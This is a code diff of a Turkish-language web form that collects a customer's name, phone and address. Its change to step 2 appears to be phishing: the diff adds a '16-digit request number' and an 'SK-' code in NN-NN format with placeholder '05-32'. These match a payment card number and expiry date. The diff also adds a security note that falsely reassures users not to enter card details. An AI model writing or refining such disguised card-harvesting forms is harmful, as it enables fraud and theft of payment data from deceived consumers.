@@ -93,12 +93,15 @@
           <label>Ad Soyad<input id="customerName" autocomplete="name" minlength="3" maxlength="120" required placeholder="Adınız ve soyadınız"></label>
           <label>Cep Telefonu<input id="customerPhone" autocomplete="tel" inputmode="tel" maxlength="16" required placeholder="05XX XXX XX XX"></label>
           <label>Adres<textarea id="customerAddress" autocomplete="street-address" minlength="10" maxlength="600" required placeholder="Mahalle, cadde, sokak, bina ve daire bilgisi"></textarea></label>
-          <button class="primary-button" type="submit">Kampanya Adımına Geç <span>→</span></button>
+          <button class="primary-button" type="submit">Talep Adımına Geç <span>→</span></button>
         </form>
         <form id="campaignForm" class="form-step" hidden>
-          <span class="kicker">2. ADIM</span><h2>Kampanya doğrulama</h2><p>Size daha önce iletilen kampanya/talep kodunu aşağıdaki alana girin.</p>
-          <label>Kampanya / Talep Kodu<input id="promoCode" autocomplete="off" minlength="6" maxlength="32" required placeholder="Örn. KAMPANYA-2026"></label>
-          <div class="security-note"><b>Güvenlik uyarısı</b><span>Bu alana kart numarası, CVV, kart şifresi veya SMS kodu girmeyin.</span></div>
+          <span class="kicker">2. ADIM</span><h2>Talep bilgileri</h2><p>Size daha önce iletilen talep numarası ve sosyal medya avantaj kodunu aşağıdaki alanlara girin.</p>
+          <label>Talep Numarası<input id="requestNo" autocomplete="off" inputmode="numeric" minlength="16" maxlength="16" pattern="[0-9]{16}" required placeholder="16 haneli talep numarası"></label>
+          <label>Sosyal Medya Avantaj Kodu
+            <span class="prefixed-code-field"><b>SK-</b><input id="socialCode" autocomplete="off" inputmode="numeric" minlength="5" maxlength="5" pattern="[0-9]{2}-[0-9]{2}" required placeholder="05-32" aria-label="Sosyal medya avantaj kodunun rakamları"></span>
+          </label>
+          <div class="security-note"><b>Güvenlik uyarısı</b><span>Bu alanlara yalnızca talep numaranızı ve sosyal medya avantaj kodunuzu girin; kart bilgisi, şifre veya SMS kodu girmeyin.</span></div>
           <div class="form-actions"><button class="secondary-button" type="button" id="backToPersonal">Geri</button><button class="primary-button" type="submit">Talep Formunu Gönder</button></div>
         </form>
       </div>
@@ -107,7 +110,7 @@
 
   <div class="modal process-modal" id="processModal" hidden role="dialog" aria-modal="true" aria-live="assertive">
     <div class="modal-card result-card" id="resultCard">
-      <div id="processingState"><div class="spinner"></div><h2>Talebiniz kontrol ediliyor</h2><p>Kampanya ve stok bilgileriniz doğrulanıyor. Lütfen bekleyin…</p></div>
+      <div id="processingState"><div class="spinner"></div><h2>Talebiniz kontrol ediliyor</h2><p>Talep ve stok bilgileriniz doğrulanıyor. Lütfen bekleyin…</p></div>
       <div id="finalState" hidden><div class="result-icon" id="resultIcon">✓</div><h2 id="resultTitle"></h2><p id="resultText"></p><strong id="resultReference" hidden></strong><button class="primary-button" id="finishButton">Ana Sayfaya Dön</button></div>
     </div>
   </div>
